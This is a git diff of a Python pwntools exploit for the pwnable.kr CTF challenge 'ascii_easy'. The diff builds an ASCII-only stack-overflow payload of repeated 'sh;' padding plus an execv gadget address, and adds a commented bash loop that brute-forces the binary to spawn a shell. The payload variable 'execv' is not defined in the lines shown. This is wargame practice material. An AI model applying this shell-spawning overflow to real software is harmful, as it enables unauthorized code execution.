@@ -4,13 +4,6 @@
 from pwn import *
 import sys
 context.log_level = 'error'
-#remoto = True
-#remoto = False
-#if remoto:
-#	s = ssh(host='pwnable.kr', user='ascii_easy', password='guest', port=2222)
-#	conn = s.process('./ascii_easy')
-#else:
-#	conn = process('./ascii_easy')
 
 # Partial RELRO   No canary found   NX enabled    No PIE
 
@@ -23,6 +16,9 @@ def isvalid(addr):
             return False 
     return True 
 """
+
+def repeat_to_length(string_to_expand, length):
+	return (string_to_expand * (int(length/len(string_to_expand))+1))[:length]
 
 def is_ascii(payload):
 	for c in payload:
@@ -37,8 +33,17 @@ lib = ELF('./libc-2.15.so')
 bin = ELF('./ascii_easy')
 
 pad = 'A' * 28 + 'B' * 4
+pad = repeat_to_length('sh;', 32)
 
-payload = ''
+payload  = execv
+payload += '!'
 
 if is_ascii(payload):
 	sys.stdout.write(pad + payload)
+
+"""
+while [ 1 ]                                                                                                                                                                         139 ↵
+do
+cat | ./ascii_easy "sh;sh;sh;sh;sh;sh;sh;sh;sh;sh;sh@gaU\!"
+done
+"""
